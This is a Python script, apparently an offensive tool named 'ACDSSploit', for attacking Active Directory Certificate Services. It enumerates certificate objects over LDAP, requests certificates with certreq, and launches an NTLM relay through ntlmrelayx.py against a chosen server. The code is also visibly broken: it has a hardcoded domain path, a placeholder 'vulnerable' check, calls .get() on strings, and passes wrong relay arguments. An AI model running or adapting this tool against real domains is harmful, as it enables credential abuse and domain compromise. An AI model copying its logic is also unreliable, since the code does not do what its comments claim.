######################################################################################################################################################################################################################
# Initial python script Framework, that installs dependencies for attacking Active Directory Certificate Services Note: Be mindful of the scope of work, & rules of engagement. By 41ph4-01, and our community.
# Ensure .env (hidden file in this directory) is in the same directory, and set to true for dry run (sumulation mode (non distructive). Test in a secure and controlled environment to avoid any unintended consequences.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import subprocess
import sys
import ldap3
import smtplib
import logging
import re
import json
from getpass import getpass
from ldap3 import Server, Connection, ALL
from dotenv import load_dotenv
import os
import time
import argparse

def display_splash_screen():
    splash = r"""
   _____  _________ ________    _________        _________        .__          .__   __                 _____  ______________  ___ ___    _____           _______  ____ 
  /  _  \ \_   ___ \\______ \  /   _____/       /   _____/______  |  |    ____ |__|_/  |_              /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
 /  /_\  \/    \  \/ |    |  \ \_____  \        \_____  \ \____ \ |  |   /  _ \|  |\   __\   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
/    |    \     \____|    `   \/        \       /        \|  |_> >|  |__(  <_> )  | |  |    /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
\____|__  /\______  /_______  /_______  /______/_______  /|   __/ |____/ \____/|__| |__|             \____   | |___||____|    \___|_  /\____   |           \_____  /___|
        \/        \/        \/        \//_____/        \/ |__|                                            |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |

"""
    print(f"{splash}")
    print("ACDSSploit - 41PH4-01 & Our Community\n")

# Setup for logging
def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s",
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler("operation_log.log")
        ]
    )

logger = logging.getLogger(__name__)

# Function to load environment variables
def load_environment():
    load_dotenv()

#  Input validation using argparse
def parse_arguments():
    parser = argparse.ArgumentParser(description="LDAP Certificate Request and Attack Simulation Tool")
    parser.add_argument("--ldap-server", required=True, help="Enter LDAP server address")
    parser.add_argument("--adcs-server", required=True, help="Enter ADCS server address")
    parser.add_argument("--domain", required=True, help="Enter domain name")
    parser.add_argument("--username", required=True, help="Enter username")
    parser.add_argument("--password", required=True, help="Enter password", type=str)
    return parser.parse_args()

# Retry logic for LDAP connection
def retry_connection(func, retries=3, delay=5, *args, **kwargs):
    for _ in range(retries):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Attempt failed: {e}. Retrying...")
            time.sleep(delay)
    logger.error("Max retries reached. Connection failed.")
    return None

# Setup LDAP connection
def setup_ldap_connection(server, username, password):
    try:
        conn = Connection(server, username, password, auto_bind=True)
        logger.info("Successfully connected to LDAP server.")
        return conn
    except Exception as e:
        logger.error(f"Failed to connect to LDAP server: {e}")
        return None

# Enumerate Certificate Templates
def enumerate_certificate_templates(conn):
    try:
        conn.search('CN=Configuration,DC=domain,DC=com', '(objectClass=pKIEnrollmentService)', attributes=['cn'])
        templates = [entry['cn'] for entry in conn.entries]
        logger.info("Certificate Templates Enumerated:")
        logger.info(templates)
        
        with open("certificate_templates.json", "w") as file:
            json.dump(templates, file, indent=4)
        return templates
    except Exception as e:
        logger.error(f"Error enumerating certificate templates: {e}")
        return []

# Detect Vulnerable Templates
def detect_vulnerable_templates(conn):
    try:
        templates = enumerate_certificate_templates(conn)
        vulnerable_templates = [template for template in templates if "desired-condition" in template]
        logger.info("Vulnerable templates detected:")
        logger.info(vulnerable_templates)
        
        with open("vulnerable_templates.json", "w") as file:
            json.dump(vulnerable_templates, file, indent=4)
        return vulnerable_templates
    except Exception as e:
        logger.error(f"Error detecting vulnerable certificate templates: {e}")
        return []

# Request Certificate (including Dry Run logic)
def request_certificate(template_name):
    if os.getenv("DRY_RUN", "False").lower() == "true":
        logger.info(f"Simulating certificate request for template: {template_name}")
        return True
    try:
        logger.info(f"Requesting certificate for template: {template_name}")
        csr_file = "request.inf"
        cert_file = "certificate.cer"
        inf_content = f"""
[Version]
Signature="$Windows NT$"

[NewRequest]
Subject = "CN={template_name}"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = TRUE
SMIME = FALSE
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0

[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.1 ; this is for Server Authentication
"""
        with open(csr_file, "w") as f:
            f.write(inf_content)

        subprocess.run(["certreq", "-new", csr_file, cert_file], check=True)
        logger.info(f"Certificate requested successfully and saved to {cert_file}")
        return True
    except Exception as e:
        logger.error(f"Failed to request certificate: {e}")
        return False

# NTLM Relay Attack with retry logic
def ntlm_relay_attack(target_server, domain, username, password):
    try:
        logger.info(f"Performing NTLM relay attack on {target_server}")
        subprocess.run(["ntlmrelayx.py", "-tf", target_server, "-c", "whoami"], check=True)
        logger.info(f"NTLM relay attack performed successfully on {target_server}")
        return True
    except Exception as e:
        logger.error(f"NTLM relay attack failed: {e}")
        return False

# Main Function
def main():
    load_environment()  # Load .env configurations
    setup_logging()  # Setup logging configuration
    
    args = parse_arguments()  # Parse input arguments

    # Retry connection logic
    server = Server(args.ldap_server, get_info=ALL)
    ldap_conn = retry_connection(setup_ldap_connection, 3, 5, server, args.username, args.password)
    if not ldap_conn:
        return

    # Enumerate certificate templates and detect vulnerabilities
    templates = enumerate_certificate_templates(ldap_conn)
    vulnerable_templates = detect_vulnerable_templates(ldap_conn)
    
    if vulnerable_templates:
        for template in vulnerable_templates:
            template_name = template.get("Name")
            if template_name:
                request_certificate(template_name)

    # Perform NTLM Relay Attack based on user input
    target_server = input("Enter target server for NTLM relay: ").strip()
    ntlm_relay_attack(target_server, args.domain, args.username, args.password)

if __name__ == "__main__":
    main()
